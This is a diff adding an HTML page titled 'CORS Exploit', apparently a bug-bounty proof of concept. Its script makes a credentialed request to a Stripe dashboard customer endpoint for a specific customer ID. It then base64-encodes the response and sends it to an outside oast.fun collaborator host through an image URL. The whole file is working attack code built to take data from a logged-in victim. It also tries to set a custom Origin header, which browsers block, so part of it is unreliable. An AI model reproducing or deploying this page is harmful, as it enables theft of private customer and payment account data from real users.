@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        const targetUrl = "https://dashboard.stripe.com/v1/customers/cus_QjFcjeEp9QnXXL?expand%5B%5D=tax_ids&expand%5B%5D=tax";
+        
+        // Send a CORS request
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader("Origin", "https://bcyseujrlowauorxoquuwjl64o5u9xo3d.oast.fun"); // Custom Origin Header
+        
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                const exfiltratedData = xhr.responseText;
+                // Send the exfiltrated data to your OAST collaborator server
+                const img = new Image();
+                img.src = `https://bcyseujrlowauorxoquuwjl64o5u9xo3d.oast.fun/?data=${btoa(exfiltratedData)}`;
+            }
+        };
+        
+        xhr.send();
+    </script>
+</body>
+</html>
